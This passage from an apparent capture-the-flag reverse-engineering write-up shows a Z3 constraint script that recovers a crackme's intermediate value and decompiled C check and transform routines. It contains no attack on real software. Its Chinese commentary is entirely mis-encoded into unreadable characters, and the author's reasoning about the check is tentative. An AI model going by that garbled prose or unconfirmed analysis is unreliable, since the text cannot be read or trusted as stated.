class="number">17</span>] == <span class="number">2520193</span>)</span><br><span class="line">f.add(<span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     + <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>] * <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">9</span> * z3num[<span class="number">8</span>] * <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>] * <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     - <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     - <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     - <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == <span class="number">8904587</span>)</span><br><span class="line">f.add(<span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>] * <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * (<span class="number">13</span> * z3num[<span class="number">12</span>] + <span class="number">12</span> * z3num[<span class="number">11</span>] - <span class="number">14</span> * z3num[<span class="number">13</span>] - <span class="number">15</span> * z3num[<span class="number">14</span>])</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == <span class="number">1227620874</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>] * <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">1836606059</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     - <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">8720560</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">11</span></span><br><span class="line">     * z3num[<span class="number">10</span>]</span><br><span class="line">     * (<span class="number">10</span> * z3num[<span class="number">9</span>] + <span class="number">30</span> * z3num[<span class="number">5</span>] + <span class="number">5</span> * z3num[<span class="number">4</span>] + <span class="number">4</span> * z3num[<span class="number">3</span>] - <span class="number">7</span> * z3num[<span class="number">6</span>] + <span class="number">8</span> * z3num[<span class="number">7</span>] - <span class="number">9</span> * z3num[<span class="number">8</span>])</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - (<span class="number">16</span> * z3num[<span class="number">15</span>] - <span class="number">17</span> * z3num[<span class="number">16</span>] - <span class="number">18</span> * z3num[<span class="number">17</span>]) * <span class="number">15</span> * z3num[<span class="number">14</span>] == <span class="number">11387045</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     - <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">7660269</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - (<span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">      - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">      - <span class="number">30</span> * z3num[<span class="number">5</span>])</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">2461883</span>)</span><br><span class="line">f.add(<span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">9</span> * z3num[<span class="number">8</span>] * <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     - <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>] * <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     - <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == -<span class="number">966296</span>)</span><br><span class="line">f.add(<span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + (<span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">      + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">      + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">      + <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">      + <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">      - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">      + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">      - <span class="number">9</span> * z3num[<span class="number">8</span>])</span><br><span class="line">     * <span class="number">2</span></span><br><span class="line">     * z3num[<span class="number">1</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>] == <span class="number">254500223</span>)</span><br><span class="line">f.add(<span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>] * <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     - <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == <span class="number">6022286</span>)</span><br><span class="line">f.add(<span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>] * <span class="number">8</span> * z3num[<span class="number">7</span>] * <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == -<span class="number">636956022</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>] * <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>] * <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">10631829</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">15</span> * z3num[<span class="number">14</span>] * <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + (<span class="number">4</span> * z3num[<span class="number">3</span>] - <span class="number">5</span> * z3num[<span class="number">4</span>] - <span class="number">30</span> * z3num[<span class="number">5</span>]) * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>] == <span class="number">6191333</span>)</span><br><span class="line">f.add(<span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">10</span> * z3num[<span class="number">9</span>] * <span class="number">9</span> * z3num[<span class="number">8</span>] * <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>] * <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] * <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>] == <span class="number">890415359</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>]</span><br><span class="line">     + <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     + <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>] * <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     - <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>] == <span class="number">23493664</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>] * <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>] * <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     - <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">1967260144</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f.check())</span><br><span class="line"><span class="keyword">while</span> (f.check()==sat):</span><br><span class="line">    condition = []</span><br><span class="line">    m = f.model()</span><br><span class="line">    p =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">20</span>):</span><br><span class="line">        p += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[z3num[i]])))</span><br><span class="line">        condition.append(z3num[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[z3num[i]])))</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    f.add(Or(condition))</span><br><span class="line">    <span class="comment">#hahahathisisfackflag</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¥‡æ€ªçš„æ˜¯ä¸€å¼€å§‹ç”¨æˆ–é€»è¾‘è§£ä¸å‡ºæ¥æ­£ç¡®å€¼ï¼Œä½†æ˜¯æŠŠæ‰€æœ‰éƒ½ä¸ä¹‹åå´å¯ä»¥å¾—åˆ°æ­£ç¡®çš„ç»“æœï¼ŒåŒæ—¶è¿™ä¸ªä¸æ˜¯flagæ˜¯ä¸­é—´ç”¨åšåŠ å¯†çš„å€¼</p><p>åˆå› ä¸ºåæ¥çš„ç®—æ³•æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_7FF7CCBC4830</span><span class="params">(<span class="type">char</span> *z3num)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7CCBDB069, v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; j_strlen(flag); ++i )</span><br><span class="line">    last[i] = z3num[j_strlen(flag) - i - <span class="number">1</span>] ^ storn[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åçš„æ£€æŸ¥æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">sub_7FF7CCBC4770</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7CCBDB069, v1);</span><br><span class="line">  zer0 = <span class="number">0</span>;</span><br><span class="line">  len = j_strlen(flag);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    <span class="keyword">return</span> last[zer0] == strange_num[zer0];     <span class="comment">// å‰ä¸¤ä½ç›¸ç­‰ï¼Œå› ä¸ºæ˜¯DWORD</span></span><br><span class="line">  <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¯èƒ½é”™äº†ä»€ä¹ˆï¼Œå¯èƒ½å‰ä¸¤ä½ç›¸ç­‰ç›¸å½“äºå…¨éƒ¨ç›¸ç­‰ã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0x00001207</span>, <span class="number">0</span>x00004CA0, <span class="number">0x00004F21</span>, <span class="number">0x00000039</span>, <span class="number">0</span>x<span class="number">0001A523</span>, <span class="number">0</span>x0000023A, <span class="number">0x00000926</span>, <span class="number">0</span>x00004CA7, <span class="number">0x00006560</span>, <span class="number">0x00000036</span>, <span class="number">0</span>x0001A99B, <span class="number">0</span>x00004CA8, <span class="number">0</span>x0001BBE0, <span class="number">0x00003705</span>, <span class="number">0x00000926</span>, <span class="number">0</span>x<span class="number">000077D3</span>, <span class="number">0x00009A98</span>, <span class="number">0</span>x0000657B, <span class="number">0x00000018</span>, <span class="number">0x00000B11</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br></pre></td></tr></table></figure><p>å‰é¢çš„å˜æ¢æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">change2</span><span class="params">(<span class="type">int</span> flag, __int64 exenum)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> a; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> exei; <span class="comment">// [rsp+148h] [rbp+128h]</span></span><br><span class="line"></span><br><span class="line">  exei = exenum;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7CCBDB069, exenum);</span><br><span class="line">  a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( exei )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (exei &amp; <span class="number">1</span>) != <span class="number">0</span> )                      <span class="comment">// exenumè¿™ä¸€ä½æ˜¯å¥‡æ•°</span></span><br><span class="line">      a *= flag;</span><br><span class="line">    flag = flag * flag % <span class="number">1000</span>;</span><br><span class="line">    exei &gt;&gt;= <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td 